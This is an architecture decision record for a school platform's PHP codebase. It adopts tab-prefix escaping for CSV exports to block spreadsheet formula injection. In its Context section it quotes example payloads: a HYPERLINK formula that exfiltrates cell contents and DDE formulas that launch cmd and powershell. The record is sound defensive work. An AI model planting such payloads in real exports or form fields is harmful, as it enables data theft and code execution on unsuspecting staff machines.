# ADR-034: CSV exports escape formulas with a tab, not an apostrophe

## Context

CLAUDE.md's convention — *"every listing gets CSV export"* — has produced 236
`fputcsv` calls across 101 files. None of them escaped anything.

A CSV is a text file, but Excel, LibreOffice and Google Sheets do not open it
as one. A cell whose first character is `=`, `+`, `-`, `@`, a tab or a carriage
return is parsed as a **formula**, and the person who typed that cell decides
what it does:

```
=HYPERLINK("https://elsewhere/?x="&A1,"Click for marks")
=cmd|'/c calc'!A0
@SUM(1+9)*cmd|'/c powershell IEX(...)'!A0
```

The first exfiltrates the neighbouring cell to whoever wrote it. The other two
are DDE, which still prompts on a default Excel install — and office staff
click through the prompt, because the file came out of their own school
system.

This platform is an unusually good target. Almost every column in these exports
is free text somebody typed: a student's name, a behaviour note, a leave
reason, a book title, a guardian's address. A parent who can enter their own
child's name on a registration form can put a formula into a report the
finance office opens.

Three escaping strategies were on the table:

1. **Leading apostrophe** — the answer most search results give.
2. **Leading tab.**
3. **Quote everything / force text via a BOM + `sep=`** — spreadsheet-specific
   preamble hacks.

## Decision

**Every CSV row in `app/` is written through `App\Support\Csv::put()`, which
prefixes a tab to any cell whose first character is a formula trigger.**

Not the apostrophe. An apostrophe is invisible *in Excel* and a literal
character everywhere else, so every downstream importer — a bank's reconciler,
a ministry return, `pandas.read_csv`, the next version of this app importing
its own export — sees `'Ahmed`. It trades a security bug for a data bug and
hides the data bug from the one program you happened to test in. A tab is
treated as "this is text" by every spreadsheet and strips cleanly everywhere
else.

Not the preamble hacks either: they change the file's shape for every consumer
in order to fix one consumer's parsing.

**Values that are unambiguously numeric pass through untouched.** `-450` is a
refund, not a formula, and `+9607820288` is how a Maldivian phone number is
written. Quoting every number would make the money columns useless for the
sums these files exist to support — and an export nobody can sum is an export
nobody uses, which is its own kind of failure.

`tests/Architecture/CsvWritesAreEscapedTest.php` fails on a raw `fputcsv`
anywhere outside the helper. **There is no baseline**, unlike the repo's other
architecture gates: a legitimate exception would be an export that wants a
leading `=` to reach a spreadsheet as a formula, and nothing here wants that.

Header rows go through the helper too. A header is only safe because today's
literals happen to be safe, and that is not a property worth re-deciding per
call site.

## Consequences

**Easier:** one place to change if a spreadsheet's parsing rules move. New
exports inherit the protection by copying a neighbour, which is how exports
actually get written — and if someone writes `fputcsv` from memory instead, CI
says so rather than a member of staff finding out.

**Harder:** a cell that genuinely needs to begin with `-` and is not numeric —
a code like `-PENDING`, say — arrives with a leading tab. That is visible in
the file and would need `Csv::cell()` to learn about the case. No such column
exists today.

**Not covered:** this is about what spreadsheets execute, not about what the
exports contain. Which columns belong in a download at all is a separate
judgement made per export — the staff roll and the user roster both leave out
`national_id` and `date_of_birth` for that reason, and `people.sensitive` has
no export at all.

**A note on scope:** the 101-file rewrite was mechanical (`fputcsv(` →
`Csv::put(`, plus an import) and is covered by the existing export tests, which
assert CSV *contents* rather than status codes. The full suite — 1870 tests —
passed unchanged, and a live payload planted in `book_titles` came back
neutralised in a file downloaded through the browser.
